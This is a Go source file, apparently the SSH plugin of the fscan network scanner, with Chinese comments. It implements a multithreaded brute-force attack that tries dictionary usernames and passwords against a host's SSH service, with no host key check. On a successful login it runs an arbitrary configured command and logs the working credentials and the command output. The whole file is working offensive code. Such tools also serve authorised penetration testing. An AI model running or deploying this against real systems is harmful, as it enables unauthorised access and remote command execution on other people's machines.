package Plugins

import (
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"net"
	"strings"
	"sync"
	"time"
)

func SshScan(info *Common.HostInfo) (tmperr error) {
	if Common.DisableBrute {
		return
	}

	threads := 10 // 设置线程数
	taskChan := make(chan struct {
		user string
		pass string
	}, len(Common.Userdict["ssh"])*len(Common.Passwords))

	// 创建结果通道
	resultChan := make(chan error, threads)

	// 生成所有任务
	for _, user := range Common.Userdict["ssh"] {
		for _, pass := range Common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			taskChan <- struct {
				user string
				pass string
			}{user, pass}
		}
	}
	close(taskChan)

	// 启动工作线程
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for task := range taskChan {
				// 为每个任务创建结果通道
				done := make(chan struct {
					success bool
					err     error
				})

				// 执行SSH连接
				go func(user, pass string) {
					success, err := SshConn(info, user, pass)
					done <- struct {
						success bool
						err     error
					}{success, err}
				}(task.user, task.pass)

				// 等待结果或超时
				var err error
				select {
				case result := <-done:
					err = result.err
					if result.success {
						resultChan <- nil
						return
					}
				case <-time.After(time.Duration(Common.Timeout) * time.Second):
					err = fmt.Errorf("连接超时")
				}

				if err != nil {
					errlog := fmt.Sprintf("[-] SSH认证失败 %v:%v User:%v Pass:%v Err:%v",
						info.Host, info.Ports, task.user, task.pass, err)
					Common.LogError(errlog)

					if Common.CheckErrs(err) {
						resultChan <- err
						return
					}
				}

				if Common.SshKeyPath != "" {
					resultChan <- err
					return
				}
			}
			resultChan <- nil
		}()
	}

	// 等待所有线程完成
	go func() {
		wg.Wait()
		close(resultChan)
	}()

	// 检查结果
	for err := range resultChan {
		if err != nil {
			tmperr = err
			if Common.CheckErrs(err) {
				return err
			}
		}
	}

	return tmperr
}

func SshConn(info *Common.HostInfo, user string, pass string) (flag bool, err error) {
	var auth []ssh.AuthMethod
	if Common.SshKeyPath != "" {
		pemBytes, err := ioutil.ReadFile(Common.SshKeyPath)
		if err != nil {
			return false, fmt.Errorf("[-] 读取密钥失败: %v", err)
		}

		signer, err := ssh.ParsePrivateKey(pemBytes)
		if err != nil {
			return false, fmt.Errorf("[-] 解析密钥失败: %v", err)
		}
		auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
	} else {
		auth = []ssh.AuthMethod{ssh.Password(pass)}
	}

	config := &ssh.ClientConfig{
		User: user,
		Auth: auth,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
		Timeout: time.Duration(Common.Timeout) * time.Millisecond,
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", info.Host, info.Ports), config)
	if err != nil {
		return false, err
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return false, err
	}
	defer session.Close()

	flag = true

	if Common.Command != "" {
		output, err := session.CombinedOutput(Common.Command)
		if err != nil {
			return true, err
		}
		if Common.SshKeyPath != "" {
			Common.LogSuccess(fmt.Sprintf("[+] SSH密钥认证成功 %v:%v\n命令输出:\n%v",
				info.Host, info.Ports, string(output)))
		} else {
			Common.LogSuccess(fmt.Sprintf("[+] SSH认证成功 %v:%v User:%v Pass:%v\n命令输出:\n%v",
				info.Host, info.Ports, user, pass, string(output)))
		}
	} else {
		if Common.SshKeyPath != "" {
			Common.LogSuccess(fmt.Sprintf("[+] SSH密钥认证成功 %v:%v",
				info.Host, info.Ports))
		} else {
			Common.LogSuccess(fmt.Sprintf("[+] SSH认证成功 %v:%v User:%v Pass:%v",
				info.Host, info.Ports, user, pass))
		}
	}

	return flag, nil
}
